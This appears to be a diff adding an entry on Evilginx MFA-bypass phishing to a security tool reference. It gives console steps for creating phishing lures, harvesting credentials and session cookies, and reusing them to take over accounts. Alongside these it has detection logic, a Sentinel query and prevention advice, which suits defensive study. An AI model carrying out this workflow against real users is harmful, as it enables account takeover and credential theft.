@@ -1,0 +1,98 @@
+{
+  "id": "phish-evilginx",
+  "name": "Evilginx - MFA-Bypass Phishing Proxy",
+  "command": "evilginx2 -p <file>",
+  "description": "Evilginx is a man-in-the-middle reverse-proxy phishing framework that sits between the victim and the real login site. Because it relays the genuine pages, it captures not just the password but the authenticated session cookie, defeating most MFA. 'Phishlets' define per-site proxy rules and 'lures' generate the phishing URLs.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Social Engineering",
+  "subcategory": "Phishing",
+  "certifications": [],
+  "primary_cert": "",
+  "source": "kgretzky/evilginx2",
+  "tags": [
+    "evilginx",
+    "phishing",
+    "mfa-bypass",
+    "session-hijacking",
+    "reverse-proxy",
+    "social-engineering"
+  ],
+  "mitre": [
+    "T1557",
+    "T1539",
+    "T1598.003"
+  ],
+  "exam": "lab-only",
+  "notes": "=== PREREQ ===\n  # a domain you control + DNS A records pointing to the server;\n  # 443 open; Evilginx auto-provisions LetsEncrypt certs\n\n=== START ===\n  evilginx2 -p ./phishlets            # -p = phishlets dir\n\n=== CONFIGURE (in the console) ===\n  config domain <domain>\n  config ipv4 <ip>\n  phishlets hostname o365 <login.yourdomain>\n  phishlets enable o365\n\n=== CREATE A LURE ===\n  lures create o365\n  lures get-url <id>                  # the link to send the victim\n\n=== HARVEST ===\n  sessions                           # list captured sessions\n  sessions <id>                      # show creds + captured cookies (tokens)\n  # import the cookie into a browser -> authenticated as the victim, MFA already satisfied\n\n=== ALTERNATIVES ===\n  Modlishka / Muraena      # similar reverse-proxy phishing\n  GoPhish                  # credential-harvest (no live MFA relay)\n  TokenTactics             # reuse the stolen session for M365 pivoting",
+  "examples": [
+    {
+      "label": "Start with a phishlets directory",
+      "command": "evilginx2 -p ./phishlets"
+    },
+    {
+      "label": "Generate a lure URL (console)",
+      "command": "lures create o365; lures get-url <id>"
+    },
+    {
+      "label": "Dump a captured session",
+      "command": "sessions <id>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Evilginx2",
+      "url": "https://github.com/kgretzky/evilginx2"
+    },
+    {
+      "title": "MITRE T1539 - Steal Web Session Cookie",
+      "url": "https://attack.mitre.org/techniques/T1539/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "phish-gophish",
+      "note": "GoPhish to manage the campaign/email delivery.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-tokentactics",
+      "note": "Reuse the stolen M365 session to mint more tokens.",
+      "rel": "next"
+    },
+    {
+      "id": "cloud-aadinternals",
+      "note": "Pivot the hijacked session into broader Entra attacks.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "By proxying the real site, Evilginx relays legitimate authentication (including the MFA challenge) and captures the resulting session cookie. Possession of that cookie grants access without re-authenticating, so traditional MFA does not stop it.",
+    "prerequisites": "A look-alike domain, a server with valid TLS, and a victim who clicks the lure and authenticates.",
+    "impact": "Full account takeover via stolen session cookies, bypassing password+MFA; a foothold for cloud/identity pivoting.",
+    "detection": "[MITRE T1539/T1557] Sign-ins where the session originates from an unexpected IP/ASN immediately after a legitimate-looking auth; token use from a different geolocation/device than the login; proxy-added artifacts; newly registered look-alike domains; Conditional Access device/location anomalies.",
+    "artifacts": "Entra/IdP sign-in logs showing cookie reuse from a new IP/device, impossible travel, missing device compliance, referrer/UA mismatches, lookalike-domain DNS/cert transparency hits.",
+    "prevention": "Phishing-resistant MFA (FIDO2/WebAuthn, which binds to the real origin and defeats proxying); Conditional Access requiring compliant/managed devices and token binding; continuous access evaluation; user training + lookalike-domain monitoring; block newly registered domains at the proxy.",
+    "sources": [
+      "kgretzky/evilginx2",
+      "https://attack.mitre.org/techniques/T1539/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Session cookie reuse from new IP after sign-in (AiTM phishing)",
+        "logic": "SigninLogs\n| where ResultType == 0\n| extend Loc = tostring(LocationDetails.countryOrRegion)\n| summarize Locs=dcount(Loc), IPs=dcount(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where IPs > 1 and Locs > 1",
+        "data_source": "entra-id",
+        "attack": [
+          "T1539",
+          "T1557"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "VPNs, travelling users, mobile+desktop",
+        "tuning": "Require device-compliance context; prioritize unmanaged-device sign-ins"
+      }
+    ]
+  }
+}
